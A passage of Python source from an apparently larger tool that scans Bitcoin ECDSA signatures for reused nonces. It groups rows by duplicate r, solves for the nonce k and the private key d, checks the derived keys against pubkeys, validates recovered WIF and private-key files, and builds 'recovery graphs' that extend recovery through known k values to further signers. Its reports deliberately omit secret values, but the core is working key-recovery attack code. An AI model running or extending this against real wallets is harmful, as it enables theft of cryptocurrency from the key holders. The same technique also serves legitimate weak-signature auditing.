                        "unique_tx_inputs": len(tx_inputs),
                        "recoverable_focus": is_recoverable_focus,
                    }
                )

                for raw, _ in rows:
                    out.write(raw + "\n")
                    selected += 1
                    if is_nontrivial:
                        nontrivial_selected += 1
                    if is_recoverable_focus:
                        recoverable_selected += 1
                        if recoverable_out is not None:
                            recoverable_out.write(raw + "\n")
                    else:
                        replay_selected += 1
                        if replay_out is not None:
                            replay_out.write(raw + "\n")
    finally:
        if recoverable_out is not None:
            recoverable_out.close()
        if replay_out is not None:
            replay_out.close()

    report_groups.sort(
        key=lambda x: (
            bool(x.get("recoverable_focus")),
            int(x.get("unique_pubkeys", 0)),
            int(x.get("unique_s", 0)),
            int(x.get("rows", 0)),
        ),
        reverse=True,
    )
    if report_path is not None:
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_payload = {
            "input": str(sig_path),
            "all_duplicate_rows_out": str(out_path),
            "recoverable_rows_out": str(recoverable_out_path) if recoverable_out_path else None,
            "replay_rows_out": str(replay_out_path) if replay_out_path else None,
            "duplicate_r_groups": len(dup_groups),
            "recoverable_focus_groups": sum(1 for g in report_groups if g["recoverable_focus"]),
            "recoverable_focus_rows": recoverable_selected,
            "replay_like_rows": replay_selected,
            "cross_pub_duplicate_r_groups": cross_pub_groups,
            "groups": report_groups[:500],
        }
        report_path.write_text(json.dumps(report_payload, indent=2), encoding="utf-8")

    return {
        "duplicate_r_groups": len(dup_groups),
        "nontrivial_duplicate_r_groups": nontrivial_groups,
        "exact_replay_groups": exact_replay_groups,
        "same_r_same_s_diff_z_groups": same_r_same_s_diff_z_groups,
        "same_r_diff_s_groups": same_r_diff_s_groups,
        "cross_pub_duplicate_r_groups": cross_pub_groups,
        "selected_signatures": selected,
        "selected_signatures_nontrivial": nontrivial_selected,
        "selected_signatures_recoverable_focus": recoverable_selected,
        "selected_signatures_replay_like": replay_selected,
        "output": str(out_path),
        "recoverable_output": str(recoverable_out_path) if recoverable_out_path else None,
        "replay_output": str(replay_out_path) if replay_out_path else None,
        "classification_report": str(report_path) if report_path else None,
    }


def _safe_row_id(obj: dict[str, Any], idx: int) -> dict[str, Any]:
    return {
        "index": idx,
        "txid": str(obj.get("txid") or "")[:16],
        "vin": obj.get("vin", obj.get("input_index")),
        "pubkey_prefix": normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))[:20],
    }


def _extract_der_and_sighash(sig_hex: str) -> tuple[bytes | None, int | None, str | None]:
    if not sig_hex:
        return None, None, "missing_signature_hex"
    try:
        b = bytes.fromhex(sig_hex)
    except Exception:
        return None, None, "bad_signature_hex"
    if len(b) < 8 or b[0] != 0x30:
        return None, None, "not_der"
    if len(b) >= 2 and (2 + b[1]) == len(b):
        return b, None, None
    if len(b) >= 3 and (2 + b[1]) == len(b) - 1:
        return b[:-1], b[-1], None
    return None, b[-1] if b else None, "bad_der_length"


def _parse_der_rs(der: bytes | None) -> tuple[int | None, int | None, str | None]:
    if not der:
        return None, None, "missing_der"
    try:
        if len(der) < 8 or der[0] != 0x30:
            return None, None, "not_sequence"
        pos = 2
        if der[pos] != 0x02:
            return None, None, "missing_r_integer"
        r_len = der[pos + 1]
        r_bytes = der[pos + 2:pos + 2 + r_len]
        pos += 2 + r_len
        if pos + 2 > len(der) or der[pos] != 0x02:
            return None, None, "missing_s_integer"
        s_len = der[pos + 1]
        s_bytes = der[pos + 2:pos + 2 + s_len]
        if pos + 2 + s_len != len(der):
            return None, None, "trailing_der_bytes"
        return int.from_bytes(r_bytes, "big"), int.from_bytes(s_bytes, "big"), None
    except Exception as e:
        return None, None, f"der_parse_exception:{type(e).__name__}"


def _verify_row_signature(obj: dict[str, Any]) -> tuple[bool | None, str]:
    pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
    sig_hex = str(obj.get("signature_hex") or obj.get("sig") or "")
    if not pub:
        return None, "missing_pubkey"
    try:
        z = parse_int(obj.get("z"))
        if not (0 <= z < 2**256):
            return None, "z_out_of_256_bit_range"
    except Exception:
        return None, "bad_z"
    der, _, der_reason = _extract_der_and_sighash(sig_hex)
    if der is None:
        return None, der_reason or "bad_der"
    try:
        from coincurve import PublicKey  # type: ignore
        ok = bool(PublicKey(bytes.fromhex(pub)).verify(der, z.to_bytes(32, "big"), hasher=None))
        return ok, "ok" if ok else "verify_false"
    except ValueError:
        return False, "pubkey_parse_error"
    except Exception as e:
        return False, f"verify_exception:{type(e).__name__}"


def _recompute_z_from_context(obj: dict[str, Any]) -> tuple[bool | None, str]:
    ctx = obj.get("sighash_context")
    if not isinstance(ctx, dict):
        return None, "missing_sighash_context"
    try:
        from download_signatures import bip143_sighash, legacy_sighash  # type: ignore
        vin_index = int(ctx.get("vin_index", obj.get("vin", 0)))
        script_code = str(ctx.get("script_code") or obj.get("script_code") or "")
        if not script_code:
            return None, "missing_script_code"
        sighash = int(obj.get("sighash"))
        tx = {
            "version": int(ctx.get("version", 2)),
            "locktime": int(ctx.get("locktime", 0)),
            "vin": [
                {
                    "txid": str(inp.get("txid") or ""),
                    "vout": int(inp.get("vout", 0)),
                    "sequence": int(inp.get("sequence", 0xffffffff)),
                }
                for inp in (ctx.get("inputs") or [])
                if isinstance(inp, dict)
            ],
            "vout": [
                {
                    "value": int(out.get("value", 0)),
                    "scriptpubkey": str(out.get("scriptpubkey") or ""),
                }
                for out in (ctx.get("outputs") or [])
                if isinstance(out, dict)
            ],
        }
        if not tx["vin"] or vin_index < 0 or vin_index >= len(tx["vin"]):
            return None, "bad_context_inputs"
        algorithm = str(ctx.get("algorithm") or "").lower()
        if algorithm == "bip143":
            z_calc = bip143_sighash(tx, vin_index, int(ctx.get("prev_value", obj.get("prev_value", 0))), script_code, sighash)
        elif algorithm == "legacy":
            z_calc = legacy_sighash(tx, vin_index, script_code, sighash)
        else:
            return None, "unknown_sighash_algorithm"
        z_row = parse_int(obj.get("z"))
        return z_calc == z_row, "z_recompute_match" if z_calc == z_row else "z_recompute_mismatch"
    except Exception as e:
        return None, f"z_recompute_exception:{type(e).__name__}"


def _derived_pubkey_matches(d: int, pubkeys: set[str]) -> tuple[bool | None, str]:
    if not pubkeys:
        return None, "missing_pubkey"
    try:
        from coincurve import PrivateKey  # type: ignore
        pk = PrivateKey(d.to_bytes(32, "big"))
        compressed = pk.public_key.format(compressed=True).hex()
        uncompressed = pk.public_key.format(compressed=False).hex()
        return bool({compressed, uncompressed} & pubkeys), "ok"
    except Exception as e:
        return None, f"derive_pubkey_exception:{type(e).__name__}"


def build_duplicate_r_pair_diagnostics(
    sig_path: Path,
    out_path: Path,
    max_groups: int = 500,
    max_pair_samples: int = 200,
) -> dict[str, Any]:
    """Explain duplicate-r recoverability without writing d/k material.

    Full Bitcoin sighash reconstruction is intentionally marked as not available
    unless raw tx/preimage data exists in the row. Local checks still catch the
    common blockers: bad DER, row r/s mismatch, bad z shape, invalid signature,
    cross-pub pairs, non-invertible denominators, and derived-pubkey mismatch.
    """
    rows_by_r: dict[int, list[tuple[int, dict[str, Any]]]] = defaultdict(list)
    row_count = 0
    malformed_rows = 0
    row_reason_counts: Counter[str] = Counter()
    with sig_path.open("r", encoding="utf-8") as f:
        for idx, line in enumerate(f):
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
                if not isinstance(obj, dict):
                    malformed_rows += 1
                    continue
                r = parse_int(obj.get("r"))
                rows_by_r[r].append((idx, obj))
                row_count += 1
            except Exception:
                malformed_rows += 1

    groups = [(r, rows) for r, rows in rows_by_r.items() if len(rows) > 1]
    groups.sort(key=lambda item: len(item[1]), reverse=True)
    groups = groups[:max_groups]

    pair_reason_counts: Counter[str] = Counter()
    row_verification_counts: Counter[str] = Counter()
    z_recompute_counts: Counter[str] = Counter()
    group_reports: list[dict[str, Any]] = []
    pair_samples: list[dict[str, Any]] = []
    total_pairs = 0
    direct_candidate_pairs = 0
    direct_valid_pairs = 0
    cross_pub_pairs = 0

    for r, rows in groups:
        group_pair_reasons: Counter[str] = Counter()
        group_valid = 0
        group_direct = 0
        try:
            r_inv = pow(r, -1, SECP256K1_N) if 1 <= r < SECP256K1_N else None
        except ValueError:
            r_inv = None
        row_summaries = []
        for idx, obj in rows:
            row_reasons = []
            try:
                row_r = parse_int(obj.get("r"))
                row_s = parse_int(obj.get("s"))
                row_z = parse_int(obj.get("z"))
            except Exception:
                row_reasons.append("bad_numeric_field")
                row_reason_counts["bad_numeric_field"] += 1
                row_summaries.append({**_safe_row_id(obj, idx), "reasons": row_reasons})
                continue
            sig_hex = str(obj.get("signature_hex") or obj.get("sig") or "")
            der, sighash_byte, der_reason = _extract_der_and_sighash(sig_hex)
            der_r, der_s, parse_reason = _parse_der_rs(der)
            if der_reason:
                row_reasons.append(der_reason)
            if parse_reason:
                row_reasons.append(parse_reason)
            if der_r is not None and der_r != row_r:
                row_reasons.append("der_r_mismatch")
            if der_s is not None and der_s != row_s:
                # Low-S normalization can intentionally change row s. Keep it
                # distinct from a hard mismatch for debugging.
                if (SECP256K1_N - der_s) % SECP256K1_N == row_s:
                    row_reasons.append("row_s_is_low_s_normalized")
                else:
                    row_reasons.append("der_s_mismatch")
            if sighash_byte is not None and obj.get("sighash") is not None:
                try:
                    if int(obj.get("sighash")) != int(sighash_byte):
                        row_reasons.append("sighash_byte_mismatch")
                except Exception:
                    row_reasons.append("bad_sighash_field")
            if not (0 <= row_z < 2**256):
                row_reasons.append("z_out_of_256_bit_range")
            ok, verify_reason = _verify_row_signature(obj)
            row_verification_counts[verify_reason] += 1
            if ok is False:
                row_reasons.append(f"signature_{verify_reason}")
            z_ok, z_reason = _recompute_z_from_context(obj)
            z_recompute_counts[z_reason] += 1
            if z_ok is False:
                row_reasons.append(z_reason)
            for reason in row_reasons:
                row_reason_counts[reason] += 1
            row_summaries.append(
                {
                    **_safe_row_id(obj, idx),
                    "signature_verification": verify_reason,
                    "z_recompute": z_reason,
                    "sighash_byte": sighash_byte,
                    "row_sighash": obj.get("sighash"),
                    "reasons": row_reasons,
                }
            )

        for a in range(len(rows)):
            i1, x1 = rows[a]
            for b in range(a + 1, len(rows)):
                i2, x2 = rows[b]
                total_pairs += 1
                try:
                    s1, s2 = parse_int(x1.get("s")), parse_int(x2.get("s"))
                    z1, z2 = parse_int(x1.get("z")), parse_int(x2.get("z"))
                except Exception:
                    reason = "bad_numeric_field"
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    continue
                pub1 = normalize_pubkey_hex(str(x1.get("pubkey_hex") or x1.get("pub") or ""))
                pub2 = normalize_pubkey_hex(str(x2.get("pubkey_hex") or x2.get("pub") or ""))
                if pub1 and pub2 and pub1 != pub2:
                    reason = "cross_pub_pair_not_directly_solvable"
                    cross_pub_pairs += 1
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    if len(pair_samples) < max_pair_samples:
                        pair_samples.append({"r": format(r, "064x"), "reason": reason, "rows": [_safe_row_id(x1, i1), _safe_row_id(x2, i2)]})
                    continue
                if s1 == s2:
                    reason = "same_s_noninvertible"
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    continue
                if z1 == z2:
                    reason = "same_z_no_nonce_reuse_signal"
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    continue
                denom = (s1 - s2) % SECP256K1_N
                if denom == 0 or r_inv is None:
                    reason = "bad_inverse"
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    continue
                direct_candidate_pairs += 1
                group_direct += 1
                k = ((z1 - z2) % SECP256K1_N) * pow(denom, -1, SECP256K1_N) % SECP256K1_N
                d = (((s1 * k - z1) % SECP256K1_N) * r_inv) % SECP256K1_N
                lhs1 = (s1 * k - z1) % SECP256K1_N
                lhs2 = (s2 * k - z2) % SECP256K1_N
                rhs = (r * d) % SECP256K1_N
                if lhs1 != rhs or lhs2 != rhs:
                    reason = "algebraic_equation_failed"
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    continue
                match, match_reason = _derived_pubkey_matches(d, {p for p in (pub1, pub2) if p})
                if match:
                    reason = "direct_recovery_valid"
                    direct_valid_pairs += 1
                    group_valid += 1
                elif match is False:
                    reason = "derived_pubkey_mismatch"
                else:
                    reason = match_reason
                pair_reason_counts[reason] += 1
                group_pair_reasons[reason] += 1
                if len(pair_samples) < max_pair_samples:
                    pair_samples.append({"r": format(r, "064x"), "reason": reason, "rows": [_safe_row_id(x1, i1), _safe_row_id(x2, i2)]})

        pubs = {
            normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            for _, obj in rows
            if normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
        }
        group_reports.append(
            {
                "r": format(r, "064x"),
                "rows": len(rows),
                "unique_pubkeys": len(pubs),
                "pairs_total": len(rows) * (len(rows) - 1) // 2,
                "direct_candidate_pairs": group_direct,
                "direct_valid_pairs": group_valid,
                "pair_reason_counts": dict(group_pair_reasons),
                "row_summaries": row_summaries[:20],
            }
        )

    payload = {
        "input": str(sig_path),
        "rows": row_count,
        "malformed_rows": malformed_rows,
        "duplicate_r_groups": len(groups),
        "pairs_total": total_pairs,
        "direct_candidate_pairs": direct_candidate_pairs,
        "direct_valid_pairs": direct_valid_pairs,
        "cross_pub_pairs": cross_pub_pairs,
        "pair_reason_counts": dict(pair_reason_counts),
        "row_reason_counts": dict(row_reason_counts),
        "row_verification_counts": dict(row_verification_counts),
        "z_recompute_counts": dict(z_recompute_counts),
        "sighash_reconstruction": {
            "available": bool(z_recompute_counts and any(k in z_recompute_counts for k in ("z_recompute_match", "z_recompute_mismatch"))),
            "reason": "z is recomputed for rows carrying sighash_context; older rows without context are reported as missing_sighash_context",
            "required_fields": ["sighash_context.version", "sighash_context.locktime", "sighash_context.inputs", "sighash_context.outputs", "sighash_context.script_code", "sighash"],
        },
        "groups": group_reports,
        "pair_samples": pair_samples,
        "priv_material": "NOT_WRITTEN",
    }
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def summarize_duplicate_r_pair_diagnostics(report: dict[str, Any]) -> dict[str, Any]:
    if not report:
        return {}
    return {
        "input": report.get("input"),
        "rows": report.get("rows", 0),
        "duplicate_r_groups": report.get("duplicate_r_groups", 0),
        "pairs_total": report.get("pairs_total", 0),
        "direct_candidate_pairs": report.get("direct_candidate_pairs", 0),
        "direct_valid_pairs": report.get("direct_valid_pairs", 0),
        "cross_pub_pairs": report.get("cross_pub_pairs", 0),
        "pair_reason_counts": report.get("pair_reason_counts", {}),
        "row_verification_counts": report.get("row_verification_counts", {}),
        "z_recompute_counts": report.get("z_recompute_counts", {}),
        "sighash_reconstruction": report.get("sighash_reconstruction", {}),
    }


BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
SECP256K1_N = int("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)


def b58decode(s: str) -> bytes:
    n = 0
    for ch in s:
        n = n * 58 + BASE58_ALPHABET.index(ch)
    b = n.to_bytes((n.bit_length() + 7) // 8, "big") if n else b""
    pad = 0
    for ch in s:
        if ch == "1":
            pad += 1
        else:
            break
    return b"\x00" * pad + b


def parse_priv_candidate(x: str) -> int | None:
    s = x.strip()
    if not s:
        return None
    try:
        if s.startswith(("0x", "0X")):
            k = int(s, 16)
        elif len(s) in {51, 52} and all(ch in BASE58_ALPHABET for ch in s):
            raw = b58decode(s)
            if len(raw) not in {37, 38}:
                return None
            payload, chk = raw[:-4], raw[-4:]
            good = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
            if chk != good:
                return None
            if payload[0] not in (0x80, 0xEF):
                return None
            key = payload[1:33]
            if len(payload) == 34 and payload[-1] != 0x01:
                return None
            k = int.from_bytes(key, "big")
        elif all(c in "0123456789abcdefABCDEF" for c in s) and len(s) == 64:
            k = int(s, 16)
        else:
            k = int(s, 10)
    except Exception:
        return None
    if 1 <= k < SECP256K1_N:
        return k
    return None


def post_validate_recovered(path: Path) -> dict[str, Any]:
    if not path.exists():
        return {"exists": False, "rows": 0, "valid_rows": 0, "invalid_rows": 0}
    rows = 0
    valid = 0
    invalid = 0
    with path.open("r", encoding="utf-8") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            rows += 1
            cand: str | None = None
            try:
                obj = json.loads(raw)
                if isinstance(obj, dict):
                    for k in ("wif", "priv_hex", "priv", "privkey", "private_key", "d"):
                        if k in obj and obj[k] is not None:
                            cand = str(obj[k])
                            break
            except Exception:
                cand = raw
            if cand is None:
                invalid += 1
            elif parse_priv_candidate(cand) is not None:
                valid += 1
            else:
                invalid += 1
    return {
        "exists": True,
        "rows": rows,
        "valid_rows": valid,
        "invalid_rows": invalid,
    }


def build_recovery_chain_report(
    *,
    sig_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    out_path: Path,
) -> dict[str, Any]:
    """Write metadata-only coverage for recovered-key propagation.

    This intentionally never copies private keys or WIF values into the report.
    """
    recovered_pubs: set[str] = set()
    methods: Counter[str] = Counter()
    bad_recovered_rows = 0
    if recovered_json_path.exists():
        with recovered_json_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_recovered_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_recovered_rows += 1
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey") or obj.get("pubkey_hex") or obj.get("pub") or ""))
                if pub:
                    recovered_pubs.add(pub)
                method = str(obj.get("method") or "unknown")
                methods[method] += 1

    matched_signatures = 0
    matched_unique_r: set[str] = set()
    matched_pub_counts: Counter[str] = Counter()
    if recovered_pubs and sig_path.exists():
        with sig_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                try:
                    obj = json.loads(raw)
                except Exception:
                    continue
                if not isinstance(obj, dict):
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                if pub not in recovered_pubs:
                    continue
                matched_signatures += 1
                matched_pub_counts[pub] += 1
                try:
                    matched_unique_r.add(format(parse_int(obj.get("r")), "064x"))
                except Exception:
                    pass

    recovered_k_rows = 0
    recovered_k_r_values: set[str] = set()
    if recovered_k_path.exists():
        with recovered_k_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                recovered_k_rows += 1
                try:
                    obj = json.loads(raw)
                    if isinstance(obj, dict) and obj.get("r") is not None:
                        recovered_k_r_values.add(format(parse_int(obj.get("r")), "064x"))
                except Exception:
                    pass

    payload = {
        "source_sigs": str(sig_path),
        "recovered_keys": str(recovered_json_path),
        "recovered_k": str(recovered_k_path),
        "recovered_pubkeys": len(recovered_pubs),
        "bad_recovered_rows": bad_recovered_rows,
        "methods": dict(methods),
        "matched_signatures_for_recovered_pubkeys": matched_signatures,
        "matched_unique_r_for_recovered_pubkeys": len(matched_unique_r),
        "recovered_k_rows": recovered_k_rows,
        "recovered_k_unique_r": len(recovered_k_r_values),
        "top_recovered_pubkey_signature_counts": [
            {"pubkey_prefix": pub[:20], "signature_count": count}
            for pub, count in matched_pub_counts.most_common(20)
        ],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def load_recovery_graph_facts(
    recovered_json_path: Path,
    recovered_k_path: Path,
) -> dict[str, Any]:
    """Load graph facts without returning any private/WIF material."""
    recovered_pubs: set[str] = set()
    recovered_r: set[str] = set()
    methods: Counter[str] = Counter()
    bad_recovered_rows = 0

    if recovered_json_path.exists():
        with recovered_json_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_recovered_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_recovered_rows += 1
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey") or obj.get("pubkey_hex") or obj.get("pub") or ""))
                if pub:
                    recovered_pubs.add(pub)
                if obj.get("r") is not None:
                    try:
                        recovered_r.add(format(parse_int(obj.get("r")), "064x"))
                    except Exception:
                        pass
                methods[str(obj.get("method") or "unknown")] += 1

    recovered_k_rows = 0
    if recovered_k_path.exists():
        with recovered_k_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                recovered_k_rows += 1
                try:
                    obj = json.loads(raw)
                except Exception:
                    continue
                if isinstance(obj, dict) and obj.get("r") is not None:
                    try:
                        recovered_r.add(format(parse_int(obj.get("r")), "064x"))
                    except Exception:
                        pass

    return {
        "recovered_pubs": recovered_pubs,
        "recovered_r": recovered_r,
        "methods": dict(methods),
        "bad_recovered_rows": bad_recovered_rows,
        "recovered_k_rows": recovered_k_rows,
    }


def build_recovery_graph_focus_subset(
    *,
    sig_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    out_path: Path,
    report_path: Path,
) -> dict[str, Any]:
    """Select rows connected to known local recovered facts.

    Rows are included when either:
    - their pubkey already has a locally recovered private key; or
    - their r has a locally recovered k candidate.

    The report is metadata-only and intentionally omits private/WIF/k values.
    """
    facts = load_recovery_graph_facts(recovered_json_path, recovered_k_path)
    recovered_pubs: set[str] = facts["recovered_pubs"]
    recovered_r: set[str] = facts["recovered_r"]

    total_rows = 0
    selected_rows = 0
    by_pub_rows = 0
    by_r_rows = 0
    both_rows = 0
    bad_json_rows = 0
    selected_unique_pub: set[str] = set()
    selected_unique_r: set[str] = set()

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8", errors="replace") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            total_rows += 1
            try:
                obj = json.loads(raw)
            except Exception:
                bad_json_rows += 1
                continue
            if not isinstance(obj, dict):
                bad_json_rows += 1
                continue

            pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            r_hex = ""
            try:
                r_hex = format(parse_int(obj.get("r")), "064x")
            except Exception:
                pass

            pub_hit = bool(pub and pub in recovered_pubs)
            r_hit = bool(r_hex and r_hex in recovered_r)
            if not (pub_hit or r_hit):
                continue

            out.write(raw + "\n")
            selected_rows += 1
            by_pub_rows += int(pub_hit)
            by_r_rows += int(r_hit)
            both_rows += int(pub_hit and r_hit)
            if pub:
                selected_unique_pub.add(pub)
            if r_hex:
                selected_unique_r.add(r_hex)

    payload = {
        "source_sigs": str(sig_path),
        "output": str(out_path),
        "recovered_keys": str(recovered_json_path),
        "recovered_k": str(recovered_k_path),
        "total_rows": total_rows,
        "selected_rows": selected_rows,
        "selected_by_pubkey_rows": by_pub_rows,
        "selected_by_recovered_r_rows": by_r_rows,
        "selected_by_both_rows": both_rows,
        "selected_unique_pubkeys": len(selected_unique_pub),
        "selected_unique_r": len(selected_unique_r),
        "known_recovered_pubkeys": len(recovered_pubs),
        "known_recovered_r": len(recovered_r),
        "recovered_methods": facts["methods"],
        "recovered_k_rows": facts["recovered_k_rows"],
        "bad_json_rows": bad_json_rows,
        "bad_recovered_rows": facts["bad_recovered_rows"],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def build_recovery_graph_expansion_report(
    *,
    graph_subset_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    pre_validation: dict[str, Any],
    post_validation: dict[str, Any],
    out_path: Path,
) -> dict[str, Any]:
    """Classify graph-selected rows and explain expansion blockers.

    This report is intentionally metadata-only: it never includes private keys,
    WIF values, raw k values, full pubkeys, or full r values.
    """
    facts = load_recovery_graph_facts(recovered_json_path, recovered_k_path)
    recovered_pubs: set[str] = facts["recovered_pubs"]
    recovered_r: set[str] = facts["recovered_r"]

    rows = 0
    bad_json_rows = 0
    selected_by_pub_only = 0
    selected_by_r_only = 0
    selected_by_both = 0
    known_k_should_derive_new_d_rows = 0
    same_r_multi_pub_groups = 0
    same_r_diff_s_groups = 0
    same_r_diff_z_groups = 0
    rows_missing_pubkey = 0
    rows_missing_or_bad_r = 0
    rows_with_bad_s_or_z = 0
    r_groups: dict[str, dict[str, Any]] = {}

    if graph_subset_path.exists():
        with graph_subset_path.open("r", encoding="utf-8", errors="replace") as f:
            for line in f:
                raw = line.strip()
                if not raw:
                    continue
                rows += 1
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_json_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_json_rows += 1
                    continue

                pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                if not pub:
                    rows_missing_pubkey += 1

                r_hex = ""
                try:
                    r_hex = format(parse_int(obj.get("r")), "064x")
                except Exception:
                    rows_missing_or_bad_r += 1

                s_hex = ""
                z_hex = ""
                try:
                    s_hex = format(parse_int(obj.get("s")), "064x")
                    z_raw = obj.get("z")
                    if z_raw is None:
                        z_raw = obj.get("m")
                    z_hex = format(parse_int(z_raw), "064x")
                except Exception:
                    rows_with_bad_s_or_z += 1

                pub_hit = bool(pub and pub in recovered_pubs)
                r_hit = bool(r_hex and r_hex in recovered_r)
                if pub_hit and r_hit:
                    selected_by_both += 1
                elif pub_hit:
                    selected_by_pub_only += 1
                elif r_hit:
                    selected_by_r_only += 1

                # A recovered k for an unrecovered pubkey is the key-expansion
                # opportunity. If no new key appears after chain stage, likely
                # blockers are z mismatch, pubkey mismatch, or bad source data.
                if r_hit and pub and pub not in recovered_pubs:
                    known_k_should_derive_new_d_rows += 1

                if r_hex:
                    g = r_groups.setdefault(
                        r_hex,
                        {"pubs": set(), "s": set(), "z": set(), "rows": 0, "recovered_r": r_hex in recovered_r},
                    )
                    g["rows"] += 1
                    if pub:
                        g["pubs"].add(pub)
                    if s_hex:
                        g["s"].add(s_hex)
                    if z_hex:
                        g["z"].add(z_hex)

    top_groups = []
    for r_hex, g in r_groups.items():
        pub_count = len(g["pubs"])
        s_count = len(g["s"])
        z_count = len(g["z"])
        if pub_count > 1:
            same_r_multi_pub_groups += 1
        if s_count > 1:
            same_r_diff_s_groups += 1
        if z_count > 1:
            same_r_diff_z_groups += 1
        top_groups.append(
            {
                "r_prefix": r_hex[:16],
                "rows": g["rows"],
                "unique_pubkeys": pub_count,
                "unique_s": s_count,
                "unique_z": z_count,
                "has_recovered_k": bool(g["recovered_r"]),
            }
        )

    top_groups.sort(
        key=lambda x: (
            int(x["has_recovered_k"]),
            int(x["unique_pubkeys"]),
            int(x["unique_s"]),
            int(x["unique_z"]),
            int(x["rows"]),
        ),
        reverse=True,
    )

    pre_valid = int(pre_validation.get("valid_rows", 0) or 0)
    post_valid = int(post_validation.get("valid_rows", 0) or 0)
    new_valid = max(0, post_valid - pre_valid)
    likely_blockers = []
    if known_k_should_derive_new_d_rows > 0 and new_valid == 0:
        likely_blockers.append("known_k_rows_did_not_validate_new_pubkeys")
    if rows_with_bad_s_or_z > 0:
        likely_blockers.append("bad_or_missing_s_z_in_graph_subset")
    if rows_missing_pubkey > 0:
        likely_blockers.append("missing_pubkey_blocks_strict_validation")
    if same_r_multi_pub_groups > 0 and new_valid == 0:
        likely_blockers.append("cross_pub_same_r_present_but_no_valid_new_d")

    payload = {
        "graph_subset": str(graph_subset_path),
        "rows": rows,
        "bad_json_rows": bad_json_rows,
        "selected_by_pubkey_only_rows": selected_by_pub_only,
        "selected_by_recovered_r_only_rows": selected_by_r_only,
        "selected_by_both_rows": selected_by_both,
        "known_k_should_derive_new_d_rows": known_k_should_derive_new_d_rows,
        "same_r_multi_pub_groups": same_r_multi_pub_groups,
        "same_r_diff_s_groups": same_r_diff_s_groups,
        "same_r_diff_z_groups": same_r_diff_z_groups,
        "rows_missing_pubkey": rows_missing_pubkey,
        "rows_missing_or_bad_r": rows_missing_or_bad_r,
        "rows_with_bad_s_or_z": rows_with_bad_s_or_z,
        "pre_valid_recovered_rows": pre_valid,
        "post_valid_recovered_rows": post_valid,
        "new_valid_rows_from_graph_stage": new_valid,
        "likely_blockers": likely_blockers,
        "top_r_groups": top_groups[:50],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def _signature_order_key(obj: dict[str, Any], fallback_index: int) -> tuple[int, int, str, int]:
    height_raw = (
        obj.get("height")
        if obj.get("height") is not None
        else obj.get("block_height")
        if obj.get("block_height") is not None
        else obj.get("block")
    )
    time_raw = obj.get("time") if obj.get("time") is not None else obj.get("block_time")
    try:
        height = parse_int(height_raw) if height_raw is not None else 0
    except Exception:
        height = 0
    try:
        ts = parse_int(time_raw) if time_raw is not None else 0
    except Exception:
        ts = 0
    txid = str(obj.get("txid") or "")
    try:
        vin = parse_int(obj.get("vin") if obj.get("vin") is not None else obj.get("input_index") or 0)
    except Exception:
        vin = 0
    return (height or fallback_index, ts, txid, vin)


def build_signer_relation_neighborhood_subset(
    *,
    sig_path: Path,
    recovered_json_path: Path,
    recovered_k_path: Path,
    out_path: Path,
    report_path: Path,
    min_sigs: int,
    max_signers: int,
    max_rows_per_signer: int,
    neighbor_window: int,
) -> dict[str, Any]:
    """Build a bounded signer-local subset for delta/affine nonce-relation scans.

    This is metadata-only except for the selected signature rows. It avoids
    private/WIF/k disclosure and keeps relation scans focused on same-signer
